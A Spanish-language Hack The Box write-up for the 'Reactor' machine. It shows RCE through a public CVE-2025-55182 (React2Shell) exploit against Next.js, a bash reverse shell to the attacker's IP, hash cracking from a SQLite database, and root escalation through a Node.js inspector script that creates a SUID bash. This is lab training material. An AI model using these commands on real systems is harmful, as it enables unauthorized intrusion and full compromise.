---
layout: single
title: "HTB Reactor - Writeup"
date: 2026-05-23
difficulty: Fácil
operating_system: Linux
tags:
  - HTB
  - Linux
  - Fácil
  - CVE-2025-55182
  - React2Shell
  - Next.js
  - Node.js
  - Debugger
  - RCE
summary: "Explotación de CVE-2025-55182 (React2Shell) en Next.js 15.0.3 para obtener RCE, cracking de hash sqlite, y escalada a root mediante Node.js debugger inspector expuesto."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | Fácil |
| IP | 10.129.7.228 |
| Tags | `CVE-2025-55182`, `React2Shell`, `Next.js`, `Node.js`, `Debugger`, `RCE` |

## Reconocimiento

Empezamos con un escaneo completo de puertos para identificar la superficie expuesta del servidor. Solo vimos dos puertos abiertos: SSH y una aplicación web en el puerto 3000.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.7.228
```

Con los puertos identificados, hicimos un escaneo más detallado con scripts de enumeración para obtener versiones y fingerprints de cada servicio detectado.

```bash
nmap -p22,3000 -sCV 10.129.7.228
```

Descubrimos que el puerto 3000 ejecuta **Next.js** (confirmado por el header `X-Powered-By: Next.js`). La aplicación se llama **REACTORWATCH — Core Monitoring System v3.2.1**, un dashboard de monitoreo de un reactor nuclear ficticio. El buildId de Next.js es `L3bimJe_3LvBcFWAnK5L4`.

## Enumeración

Analizando la aplicación web, identificamos tres miembros del personal en el panel principal. Estos nombres son potenciales usuarios para SSH:

| Avatar | Nombre | Rol | Estado |
|--------|--------|-----|--------|
| DR | Dr. Elena Rodriguez | Lead Nuclear Engineer | ONLINE |
| MK | Marcus Kim | Senior Technician | ONLINE |
| JT | James Thompson | Safety Officer | OFFLINE |

La aplicación no expone rutas de API (`/api/*` devuelve 404). No hay cookies ni autenticación visible. El `_buildManifest.js` confirma que solo hay dos páginas registradas en el Pages Router: `/_app` y `/_error`. El contenido real usa App Router con una única página principal.

Identificamos que la versión de Next.js (15.0.3) es potencialmente vulnerable a CVE-2025-29927, un bypass de middleware de autenticación, pero el exploit público CVE-2025-55182 (React2Shell) ofrecía RCE directo sin necesidad de autenticación, así que priorizamos ese camino.

## Explotación

CVE-2025-55182, conocido como **React2Shell**, es una vulnerabilidad de deserialización insegura (CVSS 10.0) que afecta a Next.js App Router en todas las versiones 15.x. Permite ejecución remota de código no autenticada a través de React Server Components (RSC).

Clonamos el exploit público desde GitHub para tener acceso a la herramienta de explotación.

```bash
git clone https://github.com/rubensuxo-eh/react2shell-exploit.git
```

Primero probamos la ejecución remota de un comando simple para confirmar que el RCE funciona. El exploit nos devuelve la salida de `whoami` directamente.

```bash
python3 exploit.py --url http://10.129.7.228:3000 --cmd "whoami"
```

El exploit confirma que el servidor ejecuta los comandos como el usuario **node**. Con el RCE confirmado, necesitamos una shell interactiva para explorar el sistema. Enviamos una reverse shell apuntando a nuestra máquina atacante.

```bash
python3 exploit.py --url http://10.129.7.228:3000 --cmd "bash -c 'bash -i >& /dev/tcp/10.10.15.130/4444 0>&1'"
```

Recibimos la conexión y ahora tenemos una shell como `node`. Listamos las variables de entorno para descubrir credenciales, rutas de bases de datos y otros secretos de la aplicación.

```bash
env
```

Entre las variables de entorno encontramos `DB_PATH=/opt/reactor-app/reactor.db`, `DB_TYPE=sqlite3`, y una `SENSOR_API_KEY`. La base de datos SQLite contiene credenciales de usuario. Abrimos la base de datos directamente para inspeccionar su contenido.

```bash
sqlite3 /opt/reactor-app/reactor.db
```

Listamos las tablas disponibles y luego extraemos todos los registros de usuarios para obtener los hashes de contraseña.

```bash
.tables
SELECT * FROM users;
```

La tabla `users` contenía dos entradas:

- `admin` — hash `a203b22191d744a4e70ada5c101b17b8`
- `engineer` — hash `39d97110eafe2a9a68639812cd271e8e`

Crackeamos el hash del usuario `engineer` con rockyou y obtuvimos la contraseña `[REDACTED]`. El hash de `admin` no se pudo crackear con el mismo diccionario. Con la contraseña en nuestro poder, cambiamos al usuario engineer mediante `su`.

```bash
su engineer
```

Ya como engineer, leemos la flag de usuario desde su directorio personal.

```bash
cat /home/engineer/user.txt
```

## Escalada de privilegios

Verificamos nuestra identidad y los grupos a los que pertenece engineer. Vimos que está en el grupo `lxd`, lo que podría ser un vector de escalada.

```bash
id
```

Probamos escalar por LXD pero descubrimos que el demonio LXD no está instalado en el sistema, así que descartamos esa ruta y buscamos otra. Enumeramos los servicios en ejecución para encontrar procesos corriendo con privilegios elevados.

```bash
systemctl list-units --type=service --state=running
```

Un servicio llamó nuestra atención inmediatamente: `uptime-monitor.service`. Inspeccionamos su configuración para entender qué hace y con qué privilegios se ejecuta.

```bash
systemctl cat uptime-monitor.service
```

El servicio ejecuta un script Node.js como **root** con el debugger inspector expuesto en `127.0.0.1:9229`. Esto significa que cualquiera con acceso local al puerto 9229 puede ejecutar código JavaScript arbitrario como root a través del protocolo Chrome DevTools. Verificamos que el puerto efectivamente está escuchando.

```bash
ss -tlnp | grep 9229
```

El inspector de Node.js escucha en localhost, así que necesitamos un túnel SSH para alcanzarlo desde nuestra máquina atacante. Creamos un forward del puerto 9229 local al 9229 remoto.

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.7.228
```

Con el túnel activo, consultamos el endpoint `/json` del inspector para obtener el identificador único de la sesión de depuración y la URL del WebSocket.

```bash
curl http://127.0.0.1:9229/json
```

El inspector nos devuelve el `webSocketDebuggerUrl` con un UUID `[REDACTED]`. Usamos ese WebSocket para enviar una llamada `Runtime.evaluate` que copia `/bin/bash` a `/tmp/rootbash` y le asigna el bit SUID. Esto nos dará una shell con privilegios de root.

```bash
node -e "
const WebSocket = require('ws');
const ws = new WebSocket('ws://127.0.0.1:9229/[REDACTED]');
ws.on('open', () => {
  ws.send(JSON.stringify({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: 'process.mainModule.require(\"child_process\").execSync(\"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\").toString()'
    }
  }));
});
ws.on('message', (d) => {
  console.log(d.toString());
  ws.close();
});
"
```

Verificamos que el binario SUID se creó correctamente en `/tmp` con propietario root.

```bash
ls -la /tmp/rootbash
```

Ejecutamos el binario con `-p` (modo privileged, necesario para que bash preserve el EUID efectivo) y verificamos nuestra identidad.

```bash
/tmp/rootbash -p
whoami
```

Somos **root**. Leemos la flag final desde el directorio personal de root.

```bash
cat /root/root.txt
```

## Flags

| Flag | Hash |
|------|------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## Conclusión

HTB Reactor es una máquina de dificultad Fácil que combina la explotación de una vulnerabilidad crítica de deserialización en Next.js 15.0.3 (CVE-2025-55182, React2Shell) para obtener RCE como `node`, extracción de credenciales desde una base de datos SQLite, y escalada a root mediante el debugger inspector de Node.js expuesto localmente en el puerto 9229. La lección principal es que exponer el inspector de depuración de Node.js —incluso solo en localhost— combinado con un túnel SSH, permite ejecución de código arbitrario con los privilegios del proceso, en este caso root.
